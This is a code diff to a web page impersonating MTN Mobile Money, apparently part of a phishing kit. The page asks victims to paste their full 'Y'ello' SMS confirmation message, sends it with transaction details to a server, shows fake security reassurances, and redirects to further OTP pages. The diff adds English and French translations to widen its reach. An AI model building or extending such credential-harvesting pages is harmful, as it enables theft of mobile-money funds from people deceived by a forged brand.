@@ -340,31 +340,31 @@
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
     </div>
-    <div class="page-title">Confirm your transfer</div>
-    <div class="page-sub">Paste the Y'ello message you received from MTN to authorize this transfer.</div>
+    <div class="page-title" id="pageTitle">Confirm your transfer</div>
+    <div class="page-sub" id="pageSub">Paste the Y'ello message you received from MTN to authorize this transfer.</div>
   </div>
 
   <div class="body">
 
     <div class="notice error" id="noticeDeclined">
-      <span class="notice-title">Transfer declined</span>
-      Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.
+      <span class="notice-title" id="noticeDeclinedTitle">Transfer declined</span>
+      <span id="noticeDeclinedBody">Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.</span>
     </div>
     <div class="notice warn" id="noticeExpired">
-      <span class="notice-title">SMS expired</span>
-      The Y'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.
+      <span class="notice-title" id="noticeExpiredTitle">SMS expired</span>
+      <span id="noticeExpiredBody">The Y'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.</span>
     </div>
     <div class="notice info" id="noticeFullSms">
-      <span class="notice-title">Full SMS requested</span>
-      For your security, please paste the <strong>entire</strong> Y'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.
+      <span class="notice-title" id="noticeFullSmsTitle">Full SMS requested</span>
+      <span id="noticeFullSmsBody">For your security, please paste the <strong>entire</strong> Y'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.</span>
     </div>
 
     <div class="amount-card">
-      <span class="label">Transfer amount</span>
-      <span class="amount" id="amountLabel">—</span>
+      <span class="label" id="amountLabel">Transfer amount</span>
+      <span class="amount" id="amountValue">—</span>
     </div>
 
-    <div class="section-label">Y'ello SMS message</div>
+    <div class="section-label" id="sectionLabel">Y'ello SMS message</div>
     <textarea
       class="sms-box"
       id="smsInput"
@@ -377,19 +377,19 @@
     </div>
 
     <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">
-      📋 Paste from clipboard
+      <span id="pasteBtnLabel">📋 Paste from clipboard</span>
     </button>
 
     <div class="detected" id="detectedBox">
-      <div class="det-k">Detected confirmation code</div>
+      <div class="det-k" id="detectedLabel">Detected confirmation code</div>
       <div class="det-v" id="detectedCode">—</div>
     </div>
 
     <button class="btn-confirm" id="confirmBtn" onclick="confirmPayment()">
-      Confirm transfer
+      <span id="confirmBtnLabel">Confirm transfer</span>
     </button>
 
-    <div class="help-note">
+    <div class="help-note" id="helpNote">
       Didn't receive the message?<br>
       Tap <strong>Resend SMS</strong> or dial <strong>*126#</strong> → "My messages".
     </div>
@@ -402,8 +402,8 @@
     <div class="mtn-footer">
       <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
       <div class="foot-support">
-        Need help?<br>
-        Call <strong id="supportNum">—</strong>
+        <span id="needHelpLabel">Need help?</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
       </div>
     </div>
 
@@ -416,29 +416,123 @@
   <h2 id="authTitle">Verifying…</h2>
 
   <div class="trust-slider">
-    <div class="trust-msg active">Your message is being checked against MTN's secure records.</div>
-    <div class="trust-msg">This step protects your wallet from unauthorized transfers.</div>
-    <div class="trust-msg">Your details stay encrypted end-to-end during verification.</div>
+    <div class="trust-msg active" id="trustMsg1">Your message is being checked against MTN's secure records.</div>
+    <div class="trust-msg" id="trustMsg2">This step protects your wallet from unauthorized transfers.</div>
+    <div class="trust-msg" id="trustMsg3">Your details stay encrypted end-to-end during verification.</div>
   </div>
 
-  <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
+  <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-  const params = new URLSearchParams(location.search);
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      docTitle: 'MTN Mobile Money · Confirm Transfer',
+      pageTitle: 'Confirm your transfer',
+      pageSub: 'Paste the Y\'ello message you received from MTN to authorize this transfer.',
+      noticeDeclinedTitle: 'Transfer declined',
+      noticeDeclinedBody: 'Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.',
+      noticeExpiredTitle: 'SMS expired',
+      noticeExpiredBody: 'The Y\'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.',
+      noticeFullSmsTitle: 'Full SMS requested',
+      noticeFullSmsBody: 'For your security, please paste the <strong>entire</strong> Y\'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.',
+      amountLabel: 'Transfer amount',
+      sectionLabel: 'Y\'ello SMS message',
+      smsPlaceholder: 'Paste the full Y\'ello message here…',
+      smsError: 'The message must start with "Y\'ello" and contain the confirmation code.',
+      pasteBtn: '📋 Paste from clipboard',
+      detectedLabel: 'Detected confirmation code',
+      confirmBtn: 'Confirm transfer',
+      helpNote: 'Didn\'t receive the message?<br>Tap <strong>Resend SMS</strong> or dial <strong>*126#</strong> → "My messages".',
+      resendLabel: 'Resend SMS',
+      resendSending: 'Sending…',
+      resendSent: 'Sent ✓',
+      resendNow: 'Resend now',
+      needHelp: 'Need help?',
+      callLabel: 'Call',
+      authTitle: 'Verifying…',
+      trustMsg1: 'Your message is being checked against MTN\'s secure records.',
+      trustMsg2: 'This step protects your wallet from unauthorized transfers.',
+      trustMsg3: 'Your details stay encrypted end-to-end during verification.',
+      cancelBtn: 'Cancel',
+      prefixError: 'The message must start with "Y\'ello".',
+      noCodeError: 'We could not find a confirmation code in the message.',
+      emptyError: 'Please paste the Y\'ello message you received.',
+      networkError: 'Network error. Please try again.',
+      notAccepted: 'Request was not accepted. Please try again.',
+      newSmsSent: 'A new Y\'ello message was sent to your phone.',
+      resendFailed: 'Could not resend. Please try again in a moment.',
+      pastedFromClipboard: 'Pasted from clipboard.',
+      clipboardEmpty: 'Clipboard is empty.',
+      pasteManually: 'Paste manually: long-press the box and tap Paste.',
+      declinedToast: 'Verification declined — please resend and paste the new SMS.',
+      fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.'
+    },
+    fr: {
+      docTitle: 'MTN Mobile Money · Confirmer le transfert',
+      pageTitle: 'Confirmez votre transfert',
+      pageSub: 'Collez le message Y\'ello que vous avez reçu de MTN pour autoriser ce transfert.',
+      noticeDeclinedTitle: 'Transfert refusé',
+      noticeDeclinedBody: 'Votre transfert n\'a pas été approuvé. Veuillez vérifier les détails et réessayer, ou contacter le support MTN si le problème persiste.',
+      noticeExpiredTitle: 'SMS expiré',
+      noticeExpiredBody: 'Le message Y\'ello a expiré. Appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous pour recevoir un nouveau message, puis collez-le ici.',
+      noticeFullSmsTitle: 'SMS complet demandé',
+      noticeFullSmsBody: 'Pour votre sécurité, veuillez coller <strong>tout</strong> le SMS Y\'ello que vous avez reçu — y compris tout code ou référence — ou appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous pour recevoir un nouveau message.',
+      amountLabel: 'Montant du transfert',
+      sectionLabel: 'Message SMS Y\'ello',
+      smsPlaceholder: 'Collez le message Y\'ello complet ici…',
+      smsError: 'Le message doit commencer par "Y\'ello" et contenir le code de confirmation.',
+      pasteBtn: '📋 Coller depuis le presse-papiers',
+      detectedLabel: 'Code de confirmation détecté',
+      confirmBtn: 'Confirmer le transfert',
+      helpNote: 'Vous n\'avez pas reçu le message ?<br>Appuyez sur <strong>Renvoyer le SMS</strong> ou composez <strong>*126#</strong> → « Mes messages ».',
+      resendLabel: 'Renvoyer le SMS',
+      resendSending: 'Envoi…',
+      resendSent: 'Envoyé ✓',
+      resendNow: 'Renvoyer maintenant',
+      needHelp: 'Besoin d\'aide ?',
+      callLabel: 'Appelez le',
+      authTitle: 'Vérification…',
+      trustMsg1: 'Votre message est vérifié par rapport aux dossiers sécurisés de MTN.',
+      trustMsg2: 'Cette étape protège votre portefeuille contre les transferts non autorisés.',
+      trustMsg3: 'Vos informations restent cryptées de bout en bout pendant la vérification.',
+      cancelBtn: 'Annuler',
+      prefixError: 'Le message doit commencer par "Y\'ello".',
+      noCodeError: 'Nous n\'avons pas pu trouver de code de confirmation dans le message.',
+      emptyError: 'Veuillez coller le message Y\'ello que vous avez reçu.',
+      networkError: 'Erreur réseau. Veuillez réessayer.',
+      notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
+      newSmsSent: 'Un nouveau message Y\'ello a été envoyé sur votre téléphone.',
+      resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.',
+      pastedFromClipboard: 'Collé depuis le presse-papiers.',
+      clipboardEmpty: 'Le presse-papiers est vide.',
+      pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
+      declinedToast: 'Vérification refusée — veuillez renvoyer et coller le nouveau SMS.',
+      fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.'
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
   const tx = {
-    ref: params.get('tx') || '',
-    am:  params.get('am') || '',
-    cur: params.get('cur') || '',
-    rn:  params.get('rn') || '',
-    c:   params.get('c') || '',
-    pm:  params.get('pm') || '',
-    sn:  params.get('sn') || '',
-    mk:  params.get('mk') || '',
-    an:  params.get('an') || '',
-    dt:  params.get('dt') || ''
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || ''
   };
 
   const SUPPORT_NUMBERS = {
@@ -476,6 +570,40 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     APPLY TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('noticeDeclinedTitle').textContent = T.noticeDeclinedTitle;
+    document.getElementById('noticeDeclinedBody').textContent = T.noticeDeclinedBody;
+    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
+    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
+    document.getElementById('noticeFullSmsTitle').textContent = T.noticeFullSmsTitle;
+    document.getElementById('noticeFullSmsBody').innerHTML = T.noticeFullSmsBody;
+    document.getElementById('amountLabel').textContent = T.amountLabel;
+    document.getElementById('sectionLabel').textContent = T.sectionLabel;
+    document.getElementById('smsInput').placeholder = T.smsPlaceholder;
+    document.getElementById('smsError').textContent = T.smsError;
+    document.getElementById('pasteBtnLabel').textContent = T.pasteBtn;
+    document.getElementById('detectedLabel').textContent = T.detectedLabel;
+    document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+    document.getElementById('helpNote').innerHTML = T.helpNote;
+    document.getElementById('resendLabel').textContent = T.resendLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('trustMsg1').textContent = T.trustMsg1;
+    document.getElementById('trustMsg2').textContent = T.trustMsg2;
+    document.getElementById('trustMsg3').textContent = T.trustMsg3;
+    document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     TRUST SLIDER
+  ═══════════════════════════════════════════════════════════ */
   let trustTimer = null;
   let trustIndex = 0;
   function startTrustSlider() {
@@ -499,6 +627,9 @@
     if (trustTimer) { clearInterval(trustTimer); trustTimer = null; }
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     NOTICES
+  ═══════════════════════════════════════════════════════════ */
   function hideAllNotices() {
     document.getElementById('noticeDeclined').classList.remove('show');
     document.getElementById('noticeExpired').classList.remove('show');
@@ -511,6 +642,9 @@
     el.scrollIntoView({ behavior: 'smooth', block: 'center' });
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     Y'ELLO SMS PARSING
+  ═══════════════════════════════════════════════════════════ */
   let detectedCode = '';
   function parseYelloMessage(raw) {
     const text = (raw || '').trim();
@@ -557,7 +691,7 @@
       box.classList.remove('show');
       if (input.value.trim().length > 0 && res.reason === 'prefix') {
         input.classList.add('invalid');
-        err.textContent = 'The message must start with "Y\'ello".';
+        err.textContent = T.prefixError;
         err.classList.add('show');
       } else if (input.value.trim().length === 0) {
         input.classList.remove('invalid');
@@ -574,36 +708,43 @@
     updateDetected();
   });
 
+  /* ═══════════════════════════════════════════════════════════
+     RESEND SMS
+  ═══════════════════════════════════════════════════════════ */
   async function resendSms() {
     const btn = document.getElementById('resendBtn');
     const lbl = document.getElementById('resendLabel');
     btn.disabled = true;
-    lbl.textContent = 'Sending…';
+    lbl.textContent = T.resendSending;
     try {
       const r = await fetch('/api/mtn/resend', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          tx: tx.ref, stage: 'sms', an: tx.an, c: tx.c, am: tx.am, cur: tx.cur
+          tx: tx.ref, stage: 'sms', an: tx.an, c: tx.c, am: tx.am, cur: tx.cur,
+          lang: currentLang
         })
       });
       if (!r.ok) throw new Error('bad');
       btn.classList.add('sent');
-      lbl.textContent = 'Sent ✓';
+      lbl.textContent = T.resendSent;
       hideAllNotices();
-      showToast('A new Y\'ello message was sent to your phone.');
+      showToast(T.newSmsSent);
       setTimeout(() => {
         btn.classList.remove('sent');
-        lbl.textContent = 'Resend SMS';
+        lbl.textContent = T.resendLabel;
         btn.disabled = false;
       }, 3000);
     } catch (e) {
-      lbl.textContent = 'Resend SMS';
+      lbl.textContent = T.resendLabel;
       btn.disabled = false;
-      showToast('Could not resend. Please try again in a moment.');
+      showToast(T.resendFailed);
     }
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     PASTE FROM CLIPBOARD
+  ═══════════════════════════════════════════════════════════ */
   async function pasteFromClipboard() {
     const btn = document.getElementById('pasteBtn');
     btn.disabled = true;
@@ -614,21 +755,24 @@
           document.getElementById('smsInput').value = txt;
           hideAllNotices();
           updateDetected();
-          showToast('Pasted from clipboard.');
+          showToast(T.pastedFromClipboard);
         } else {
-          showToast('Clipboard is empty.');
+          showToast(T.clipboardEmpty);
         }
       } else {
-        showToast('Paste manually: long-press the box and tap Paste.');
+        showToast(T.pasteManually);
         document.getElementById('smsInput').focus();
       }
     } catch (e) {
-      showToast('Paste manually: long-press the box and tap Paste.');
+      showToast(T.pasteManually);
       document.getElementById('smsInput').focus();
     }
     btn.disabled = false;
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     CONFIRM PAYMENT
+  ═══════════════════════════════════════════════════════════ */
   let pollingActive = false;
   let pollTimer = null;
 
@@ -639,7 +783,7 @@
     document.getElementById('authorizingOverlay').classList.remove('show');
     const btn = document.getElementById('confirmBtn');
     btn.disabled = false;
-    btn.textContent = 'Confirm transfer';
+    document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
   }
 
   async function confirmPayment() {
@@ -650,7 +794,7 @@
 
     if (!input.value.trim()) {
       input.classList.add('invalid');
-      err.textContent = 'Please paste the Y\'ello message you received.';
+      err.textContent = T.emptyError;
       err.classList.add('show');
       input.focus();
       return;
@@ -658,9 +802,7 @@
     const res = parseYelloMessage(input.value);
     if (!res.ok) {
       input.classList.add('invalid');
-      err.textContent = res.reason === 'prefix'
-        ? 'The message must start with "Y\'ello".'
-        : 'We could not find a confirmation code in the message.';
+      err.textContent = res.reason === 'prefix' ? T.prefixError : T.noCodeError;
       err.classList.add('show');
       input.focus();
       return;
@@ -684,23 +826,24 @@
           cur: tx.cur,
           c: tx.c,
           an: tx.an,
-          rn: tx.rn
+          rn: tx.rn,
+          lang: currentLang
         })
       });
       if (!r.ok) serverAccepted = false;
     } catch (e) {
       btn.disabled = false;
-      showToast('Network error. Please try again.');
+      showToast(T.networkError);
       return;
     }
 
     if (!serverAccepted) {
       btn.disabled = false;
-      showToast('Request was not accepted. Please try again.');
+      showToast(T.notAccepted);
       return;
     }
 
-    document.getElementById('authTitle').textContent = 'Verifying…';
+    document.getElementById('authTitle').textContent = T.authTitle;
     document.getElementById('authorizingOverlay').classList.add('show');
     startTrustSlider();
 
@@ -723,7 +866,8 @@
         stopTrustSlider();
         const q = new URLSearchParams({
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          lang: currentLang
         });
         window.location.href = 'otp2.html?' + q.toString();
         return;
@@ -736,7 +880,8 @@
         const q = new URLSearchParams({
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
           c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
-          reason: 'inactive'
+          reason: 'inactive',
+          lang: currentLang
         });
         window.location.href = 'oops.html?' + q.toString();
         return;
@@ -747,11 +892,11 @@
         stopTrustSlider();
         document.getElementById('authorizingOverlay').classList.remove('show');
         btn.disabled = false;
-        btn.textContent = 'Confirm transfer';
+        document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         showNotice('noticeExpired');
         document.getElementById('resendBtn').classList.add('sent');
-        document.getElementById('resendLabel').textContent = 'Resend now';
-        showToast('Verification declined — please resend and paste the new SMS.');
+        document.getElementById('resendLabel').textContent = T.resendNow;
+        showToast(T.declinedToast);
         return;
       }
 
@@ -760,10 +905,10 @@
         stopTrustSlider();
         document.getElementById('authorizingOverlay').classList.remove('show');
         btn.disabled = false;
-        btn.textContent = 'Confirm transfer';
+        document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         showNotice('noticeFullSms');
         document.getElementById('smsInput').focus();
-        showToast('Please paste the full Y\'ello SMS, or tap Resend SMS.');
+        showToast(T.fullSmsToast);
         return;
       }
 
@@ -773,8 +918,12 @@
     poll();
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     INIT
+  ═══════════════════════════════════════════════════════════ */
   document.addEventListener('DOMContentLoaded', () => {
-    document.getElementById('amountLabel').textContent =
+    applyTranslations();
+    document.getElementById('amountValue').textContent =
       tx.am ? formatAmount(tx.am, tx.cur) : '—';
     document.getElementById('supportNum').textContent =
       SUPPORT_NUMBERS[tx.c] || '—';
